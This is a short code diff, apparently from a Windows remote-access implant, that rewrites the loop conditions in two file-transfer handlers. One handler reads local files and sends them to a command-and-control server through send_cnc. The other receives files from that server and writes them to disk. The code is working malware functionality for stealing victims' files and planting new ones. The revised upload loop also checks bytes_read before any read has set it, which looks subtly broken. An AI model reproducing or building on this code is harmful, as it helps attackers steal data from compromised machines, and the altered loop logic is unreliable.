@@ -204,15 +204,13 @@ void handle_upload_file()
         goto cleanup;
     }
 
-    while (TRUE)
+    while (bytes_read != 0)
     {
         if (!ReadFile(file, cmd.file_chunk, sizeof(cmd.file_chunk), &bytes_read, NULL))
         {
             return_code = E_FILE_READ_ERROR;
             goto cleanup;
         }
-        if (bytes_read == 0)
-            break;
 
         if (send_cnc(cmd.file_chunk, bytes_read) != bytes_read)
         {
@@ -279,13 +277,14 @@ void handle_download_file()
         goto cleanup;
     }
 
-    while (TRUE)
+    while (written_file_bytes != cmd.file_size)
     {
         if ((bytes_read = recvall_cnc(cmd.file_chunk, min(cmd.file_size - written_file_bytes, sizeof(cmd.file_chunk)))) == E_CONNECTION_CLOSED)
         {
             return_code = E_CONNECTION_CLOSED;
             goto cleanup;
         }
+
         written_file_bytes += bytes_read;
 
         if (!WriteFile(file, cmd.file_chunk, bytes_read, NULL, NULL))
@@ -293,9 +292,6 @@ void handle_download_file()
             return_code = E_FILE_WRITE_ERROR;
             goto cleanup;
         }
-
-        if (written_file_bytes == cmd.file_size)
-            break;
     }
 
 cleanup:
